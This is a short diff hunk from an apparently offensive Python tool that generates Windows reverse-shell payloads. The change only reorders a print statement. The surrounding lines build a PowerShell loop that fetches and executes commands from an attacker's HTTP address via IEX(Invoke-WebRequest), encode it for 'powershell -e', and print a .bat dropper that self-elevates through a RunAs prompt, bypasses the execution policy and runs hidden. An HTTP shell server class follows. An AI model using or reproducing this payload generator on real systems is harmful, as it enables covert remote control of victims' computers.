@@ -9,9 +9,8 @@ payload = f"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:
 e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
 print(f"{GREEN}PAYLOAD:{END}")
 print (f"powershell -e {e_payload}")
-
-print(f"{GREEN}PAYLOAD .bat{END}")
 print("")
+print(f"{GREEN}PAYLOAD .bat{END}")
 print(f"@echo off\nnet session >nul 2>&1\nif %errorLevel% == 0 (\n  goto start\n) else (\n  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n)\n:start\npowershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"{e_payload}\"\n")
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
